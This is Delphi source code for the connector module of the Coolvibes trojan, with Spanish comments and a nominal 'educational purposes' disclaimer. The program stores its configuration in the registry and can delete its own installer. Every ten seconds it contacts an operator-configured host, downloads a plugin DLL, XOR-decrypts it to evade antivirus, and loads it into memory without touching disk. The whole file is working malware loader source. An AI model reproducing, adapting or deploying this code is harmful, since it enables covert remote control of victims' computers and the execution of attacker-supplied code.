{Unit principal del Conectador del troyano Coolvibes}

(* Este c�digo fuente se ofrece s�lo con fines educativos.
   Queda absolutamente prohibido ejecutarlo en computadores
   cuyo due�o sea una persona diferente de usted, a no ser
   que el due�o haya dado permiso explicito de usarlo.

   En cualquier caso, ni www.indetectables.net  ni ninguno de
   los creadores de Coolvibes ser� responsable de cualquier
   consecuencia de usar este programa. Si no acepta esto por
   favor no compile el programa y borrelo ahora mismo.

     El equipo Coolvibes
*)
//library Conectador;
program Conectador;  {En el futuro podr� ser tanto DLL como EXE dependiendo si se utilizar� la injecci�n o no}
                     {De momento no se puede injectar ya que no leer�a la configuraci�n}
uses                 {S� que se puede injectar si se compila desde el c�digo fuente}
  Windows,
  BTMemoryModule, //Para cargar una DLL en memoria sin escribir en disco
  SettingsDef,
  WinSock,
  shellapi,
  UnitInstalacion,
  vars,
  Minireg,
  SHFolder;


var
  dllc:            string;
  Close:           boolean;
  i: integer;
function LastPos(Needle: char; Haystack: string): integer;
begin
  for Result := Length(Haystack) downto 1 do
    if Haystack[Result] = Needle then
      Break;
end;

function inttostr(const value: integer): string;
var
  S:      string[11];
begin
  Str(Value, S);
  Result := S;
end;

function strtoint(const s: string): integer;
var
  e: integer;
begin
  val(s, result, e);
end;


function fileexists(const filename: string): boolean;
var
  filedata      :twin32finddata;
  hfile         :cardinal;
begin
  hfile := findfirstfile(pchar(filename), filedata);
  if (hfile <> invalid_handle_value) then
  begin
    result := true;
    windows.findclose(hfile);
  end else
    result := false;
end;


function GetSpecialFolderPath(folder : integer) : string;    //Para el futuro %userdir%
const
  SHGFP_TYPE_CURRENT = 0;
var
  path: array [0..MAX_PATH] of char;
begin
  if SUCCEEDED(SHGetFolderPath(0,folder,0,SHGFP_TYPE_CURRENT,@path[0])) then
    Result := path
  else
    Result := '';
end;


Function GetCurrentDirectory: String;     //conseguir dir actual sin sysutils
Var
  a:string;
Begin
 a := paramstr(0);
 while pos('\', a) > 0 do
 begin
  Result := result+Copy(a, 1, Pos('\', a));
  Delete(a, 1, Pos('\', a));
  end;
End;

Function TranslateMacro(Macro: String): String;
Var
  Size          :Cardinal;
  Output        :Array[0..MAX_PATH] of Char;
Begin
  Result := '';
  FillChar(Output, SizeOf(Output), #0);

  Size := SizeOf(Output);
  Size := GetEnvironmentVariable(PChar(Macro), Output, Size);
  If (Size > 0) Then
    Result := Output;
End;

function cifrar(text: ansistring): ansistring;
var
  iloop         :integer;
begin
  for iloop := 1 to length(text) do
  begin
    text[iloop] := chr(ord(text[iloop]) xor 66);//funcion de cifrado simple para evadir antiviruses, en el futur� deber� ser dinamica
  end;
  result := text;
end;

function lc(const s: string): string;
const a=1;
var
max, charno : cardinal;
presult : pchar;
begin
max := length(s);
setlength(result, max);
if max <= 0 then exit;
presult := pchar(result);
charno := 0;
repeat
presult[charno] := s[charno+a];
if (s[charno+a]>= 'a') and (s[charno+a] <= 'z') then
presult[charno] := char(ord(s[charno+a]) + 32);
inc(charno);
until(charno>= max);
end;


function readfile(filename: string): ansistring;
var
  f             :file;
  buffer        :ansistring;
  size          :integer;
  defaultfilemode:byte;
begin
  result := '';
  defaultfilemode := filemode;
  filemode := 0;
  assignfile(f, filename);
  reset(f, 1);

  if (ioresult = 0) then
  begin
    size := filesize(f);

    setlength(buffer, size);
    blockread(f, buffer[1], size);
    result := buffer;

    closefile(f);
  end;

  filemode := defaultfilemode;
end;


procedure loaddll(path:string);
var
  content : string;
  p : pointer;
  m_DllDataSize: cardinal;
begin
  content := readfile(path);
  content := cifrar(content);
  p := @content[1];
  if(length(content) > 0) then
    BTMemoryLoadLibary(p, m_DllDataSize);   //injectamos DLL
end;


function GetIPFromHost(const HostName: string): string;
type
  TaPInAddr = array[0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe: PHostEnt;
  pptr: PaPInAddr;
  i: Integer;
begin
  Result := '';
  phe := GetHostByName(PChar(HostName));
  if phe = nil then Exit;
  pPtr := PaPInAddr(phe^.h_addr_list);
  i := 0;
  while pPtr^[i] <> nil do
  begin
    Result := inet_ntoa(pptr^[i]^);
    Inc(i);
  end;
end;


procedure iniciar();
var
   host:         String;
   port:         integer;
   wsaData:      TWSAData;
   lSocket:      TSocket;
   Addr:         TSockAddrIn;
   Enviar:       String;
   buf:          Array [0..0] of char;
   desco:        boolean;
   iRecv:        integer;
   ssize:        string;
   isize:        integer;
   plugin:       file;
   TotalRead:    integer;
   CurrRead:     integer;
   CurrWritten:  integer;
   ByteArray:   array[0..1023] of char;
begin
    desco := false;
        while fileExists(dllc) do //ya tenemos la dll
           loaddll(dllc);


    host := Configuracion.sHost;
    Port := Configuracion.iPort;



   if (WSAStartup($0202, wsaData) <> 0) then  //iniciamos winsock
     Exit;  //error


   lSocket := Socket(AF_INET, SOCK_STREAM, 0);
   Addr.sin_family   := AF_INET;
   Addr.sin_port     := htons(Port);
   Addr.sin_addr.S_addr := INET_ADDR(PChar(GetIPFromHost(Host)));


   if (winsock.Connect(lSocket, Addr, SizeOf(Addr)) = 0) then     //intentamos conectar
   begin //conectados

     Enviar := 'GETSERVER'+#13+#10;
     Send(lSocket, Enviar[1], length(Enviar), 0);  //pedimos el tama�o del servidor
     desco := false;

     ZeroMemory(@buf, SizeOf(buf));
     iRecv := Recv(lSocket, buf, SizeOf(buf), 0);   //Tenemos que leer el MAININFO
     while (iRecv > 0) do
     begin
       if(iRecv = INVALID_SOCKET) then
       begin
         desco := true;
         break;
       end;

       if(buf[0] = #14) then break;
       ZeroMemory(@buf, SizeOf(buf));
       iRecv := Recv(lSocket, buf, SizeOf(buf), 0);
     end;        //ya hemos recibido el MAININFO, ahora toca intentar recibir el tama�o

     if(desco) then
     begin
       CloseSocket(lSocket);
       exit; //nos hemos desconectado
     end;

      ZeroMemory(@buf, SizeOf(buf));
     iRecv := Recv(lSocket, buf, SizeOf(buf), 0);   //Recibimos el tama�o
     while (iRecv > 0) do
     begin
       if(iRecv = INVALID_SOCKET) then
       begin
         desco := true;
         break;
       end;

       if(buf[0] = #14) then break;
       if(buf[0] <> #10) and (buf[0] <> #13) then
       ssize := ssize+buf[0];
       ZeroMemory(@buf, SizeOf(buf));
       iRecv := Recv(lSocket, buf, SizeOf(buf), 0);
     end;
   end;


     if(desco) then
     begin
       CloseSocket(lSocket);
       exit; //nos hemos desconectado
     end;
   isize := strtoint(ssize);//ya tenemos el tama�o
    if(isize <> 0) then
    begin

   AssignFile(plugin, dllc);
   Rewrite(plugin, 1);
   Totalread := 0;

   while (TotalRead < isize) do
   begin
     ZeroMemory(@byteArray, SizeOf(byteArray));
     currRead := Recv(lSocket, byteArray, SizeOf(byteArray), 0);   //GOGOGO
     if(currRead = INVALID_SOCKET) then
     begin
       desco := true;
       break;
     end;
     TotalRead := TotalRead + currRead;
     BlockWrite(plugin, bytearray, currRead,currwritten);
     currwritten := currRead;
   end;

   CloseFile(plugin);
   end;
   
     if(desco) then
     begin
       DeleteFile(Pchar(dllc));
       CloseSocket(lSocket);
       exit; //nos hemos desconectado
     end;

    {if fileExists(dllc) then
           loaddll(dllc);   }
end;





procedure loadsettings();
var
    ConfigLeida: PSettings;
    ConfigRegistro: string;
begin
     //leerlo de la config?
  if ReadSettings(ConfigLeida) = True then   //Como no estoy instalado o no estoy injectado puedo leer la configuracion como siempre
    begin
      Configuracion.sHost   := ConfigLeida^.sHost;
      Configuracion.sPort   := ConfigLeida^.sPort;
      Configuracion.sID     := ConfigLeida^.sID;
      //Nombre que identifica al servidor. LeerID() intenta leer si hay algo escrito en el registro y si no devuelve este valor, configuracion.sID;
      Configuracion.iPort   := ConfigLeida^.iPort;
      //En segundos cada cuanto intenta conectarse el server al cliente
      Configuracion.bCopiarArchivo := ConfigLeida^.bCopiarArchivo; //Me copio o no?
      Configuracion.sFileNameToCopy := ConfigLeida^.sFileNameToCopy;
      //nombre del nuevo archivo a copiar
      Configuracion.sCopyTo := ConfigLeida^.sCopyTo;
      //la carpeta donde debe copiarse
      Configuracion.bCopiarConFechaAnterior := ConfigLeida^.bCopiarConFechaAnterior;
      //Modificar la fecha del servidor?
      Configuracion.bMelt   := ConfigLeida^.bMelt; //Melt?
      Configuracion.bArranqueRun := ConfigLeida^.bArranqueRun;
      //Me agrego a Policies?
      Configuracion.sRunRegKeyName := ConfigLeida^.sRunRegKeyName;
      //Nombre con el que me agrego a policies
      //MessageBox(0, PChar('Le� la configuraci�n bien. El puerto es: '+Configuracion.sPort), 'Le�', 0); //Para pruebas!!!
      dllc := GetCurrentDirectory+'\'+ConfigLeida^.sPluginName;

      //Preparamos la configuracion para agregarla al registro

      ConfigRegistro := ConfigRegistro + ConfigLeida^.sHost+'|';
      ConfigRegistro := ConfigRegistro + ConfigLeida^.sPort+'|';
      ConfigRegistro := ConfigRegistro + ConfigLeida^.sID+'|';
      ConfigRegistro := ConfigRegistro + inttostr(ConfigLeida^.iPort)+'|';
      if(ConfigLeida^.bCopiarArchivo) then
        ConfigRegistro := ConfigRegistro + 'true|'
      else
        ConfigRegistro := ConfigRegistro + 'false|';

      ConfigRegistro := ConfigRegistro + ConfigLeida^.sFileNameToCopy+'|';
      ConfigRegistro := ConfigRegistro + ConfigLeida^.sCopyTo+'|';

      if(ConfigLeida^.bCopiarConFechaAnterior) then
        ConfigRegistro := ConfigRegistro + 'true|'
      else
         ConfigRegistro := ConfigRegistro + 'false|';

      if(ConfigLeida^.bMelt) then
        ConfigRegistro := ConfigRegistro + 'true|'
      else
        ConfigRegistro := ConfigRegistro + 'false|';

      if(ConfigLeida^.bArranqueRun) then
        ConfigRegistro := ConfigRegistro + 'true|'
      else
        ConfigRegistro := ConfigRegistro + 'false|';


      ConfigRegistro := ConfigRegistro + ConfigLeida^.sRunRegKeyName+'|';


      RegSetString(HKEY_CURRENT_USER,'Software\C00l'{Quizas mejor un valor aleatorio?}, ConfigRegistro);
     //hay que guardar la configuraci�n al registro para que la lea el servidor
    end
    else
    begin
    //halt;  //Si he llegado a este punto es que o no he podido leer la configuraci�n o que estoy injectado en un proceso
             //As� que tengo que leer la configuracion del registro
      exitprocess(0);
      {Configuracion.sHost   := '127.0.0.1';
      Configuracion.sPort   := '7000';
      Configuracion.sID     := 'Coolserver';
      Configuracion.iPort   := 7000;
      Configuracion.iTimeToNotify := 1;
      //En segundos cada cuanto intenta conectarse el server al cliente
      Configuracion.bCopiarArchivo := false; //Me copio o no?
      Configuracion.sFileNameToCopy := 'coolserver.exe';
      //nombre del nuevo archivo a copiar
      Configuracion.sCopyTo := '%windir%\lol\'; //la carpeta donde debe copiarse
      Configuracion.bCopiarConFechaAnterior := False; //Modificar la fecha del servidor?
      Configuracion.bMelt   := False; //Melt?
      Configuracion.bArranqueRun := False; //Me agrego a Policies?
      Configuracion.sRunRegKeyName := 'Coolserver';
      //Nombre con el que me agrego a policies
      //MessageBox(0, PChar('Le� la configuraci�n bien. El puerto es: '+Configuracion.sPort), 'Le�', 0); //Para pruebas!!!
      dllc := GetCurrentDirectory+'\plugi.dat';  }
    end;
end;


procedure main;
begin


 while true do
 begin
    iniciar();
    sleep(10000); //cada 10 segundos
    while fileExists(dllc) do
      loaddll(dllc);
  end;

  WSACleanup();
end;



begin
   if ParamStr(1) = '\melt' then
    begin
      //borro el archivo de instalaci�n, reintento 5 veces por si las moscas :)
      for i := 1 to 5 do
      begin
        BorrarArchivo(ParamStr(2));
        if not FileExists(ParamStr(2)) then
          break; //si yalo borr� entonces se sale del for
        Sleep(10);
      end;
      //Otra opci�n: while not BorrarArchivo(ParamStr(2)) do Sleep(10);
    end; //Termina el Melt
  loadsettings();  //Leemos la configuraci�n
  Instalar();
  main();
end.
